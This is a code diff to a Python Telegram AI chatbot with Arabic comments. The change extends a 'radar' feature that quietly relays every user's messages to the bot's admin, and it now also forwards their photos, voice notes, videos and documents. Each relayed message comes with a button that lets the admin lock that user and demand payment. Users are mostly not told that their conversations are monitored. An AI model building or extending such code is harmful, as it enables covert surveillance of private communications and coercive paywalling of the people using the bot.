@@ -164,56 +164,71 @@ def execute_pay_lock(message, target_id):
     except: pass
 
 # ==========================================
-# --- 6. رادار المحادثات والذكاء الاصطناعي ---
+# --- 6. الرادار الشامل والذكاء الاصطناعي ---
 # ==========================================
 
-@bot.message_handler(func=lambda m: True)
+@bot.message_handler(content_types=['text', 'photo', 'voice', 'audio', 'video', 'document'])
 def main_logic(message):
     user_id = message.from_user.id
     user_name = message.from_user.first_name
-    text = message.text
+    
+    # استخراج النص سواء كان رسالة عادية أو وصفاً لصورة (Caption)
+    text = message.text or message.caption
     now = datetime.now().strftime("%H:%M:%S")
 
     save_user(user_id) 
 
+    # 📡 الرادار الشامل للأدمن
     if user_id != ADMIN_ID:
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("💰 قفل وطلب دفع", callback_data=f"ask_pay_{user_id}"))
-        bot.send_message(ADMIN_ID, f"📡 **رادار:**\n👤 {user_name} | `{user_id}`\n🕒 `{now}`\n💬 {text}", reply_markup=markup)
+        
+        radar_text = text if text else "📂 [أرسل وسائط/ملف]"
+        bot.send_message(ADMIN_ID, f"📡 **رادار:**\n👤 {user_name} | `{user_id}`\n🕒 `{now}`\n💬 {radar_text}", reply_markup=markup)
+        
+        # إعادة توجيه الصور والصوت للأدمن
+        if message.content_type != 'text':
+            bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
 
+    # التحقق من القيود المادية
     if is_restricted(user_id) and user_id != ADMIN_ID:
         bot.reply_to(message, "⚠️ **الوصول مقيد!**\nيرجى إتمام الاشتراك لإعادة تفعيل النواة.")
         return
 
-    status = bot.reply_to(message, "⚙️ Core يقوم بالتحليل...")
-    engine, error_msg = get_engine()
-    
-    if engine:
-        try:
-            if user_id not in user_memories: user_memories[user_id] = []
-            history = user_memories[user_id]
-            prompt = "\n".join(history) + f"\nUser: {text}"
-            
-            response = engine.generate_content(prompt)
-            ai_reply = response.text[:4090]
-            
-            user_memories[user_id].append(f"User: {text}")
-            user_memories[user_id].append(f"Core: {ai_reply}")
-            if len(user_memories[user_id]) > 10: user_memories[user_id] = user_memories[user_id][-10:]
-            
+    # معالجة الذكاء الاصطناعي (تعمل فقط إذا كان هناك نص)
+    if text:
+        status = bot.reply_to(message, "⚙️ Core يقوم بالتحليل...")
+        engine, error_msg = get_engine()
+        
+        if engine:
             try:
-                bot.edit_message_text(ai_reply, message.chat.id, status.message_id, parse_mode="Markdown")
-            except:
-                bot.edit_message_text(ai_reply, message.chat.id, status.message_id) 
+                if user_id not in user_memories: user_memories[user_id] = []
+                history = user_memories[user_id]
+                prompt = "\n".join(history) + f"\nUser: {text}"
                 
-        except Exception as e:
-            error_text = str(e).lower()
-            if "quota" in error_text or "429" in error_text or "rate limit" in error_text:
-                bot.edit_message_text("⚠️ **ضغط عالٍ على النواة:**\nالنظام يعالج طلبات هائلة حالياً. يرجى الانتظار نصف دقيقة والمحاولة مجدداً.", message.chat.id, status.message_id, parse_mode="Markdown")
-            else:
-                bot.edit_message_text("⚠️ **تحديث مؤقت:**\nالنواة تقوم بإعادة التشغيل، يرجى المحاولة لاحقاً.", message.chat.id, status.message_id, parse_mode="Markdown")
+                response = engine.generate_content(prompt)
+                ai_reply = response.text[:4090]
+                
+                user_memories[user_id].append(f"User: {text}")
+                user_memories[user_id].append(f"Core: {ai_reply}")
+                if len(user_memories[user_id]) > 10: user_memories[user_id] = user_memories[user_id][-10:]
+                
+                try:
+                    bot.edit_message_text(ai_reply, message.chat.id, status.message_id, parse_mode="Markdown")
+                except:
+                    bot.edit_message_text(ai_reply, message.chat.id, status.message_id) 
+                    
+            except Exception as e:
+                error_text = str(e).lower()
+                if "quota" in error_text or "429" in error_text or "rate limit" in error_text:
+                    bot.edit_message_text("⚠️ **ضغط عالٍ على النواة:**\nالنظام يعالج طلبات هائلة حالياً. يرجى الانتظار نصف دقيقة والمحاولة مجدداً.", message.chat.id, status.message_id, parse_mode="Markdown")
+                else:
+                    bot.edit_message_text("⚠️ **تحديث مؤقت:**\nالنواة تقوم بإعادة التشغيل، يرجى المحاولة لاحقاً.", message.chat.id, status.message_id, parse_mode="Markdown")
+        else:
+            bot.edit_message_text(f"⚠️ فشل الاتصال بالمحرك: `{error_msg}`", message.chat.id, status.message_id)
     else:
-        bot.edit_message_text(f"⚠️ فشل الاتصال بالمحرك: `{error_msg}`", message.chat.id, status.message_id)
+        # إذا أرسل المستخدم صورة أو بصمة صوتية بدون كتابة نص
+        bot.reply_to(message, "👁️‍🗨️ النواة استلمت الملف، وتم تحويله للمهندس المعماري.")
 
 if __name__ == "__main__":
     keep_alive()
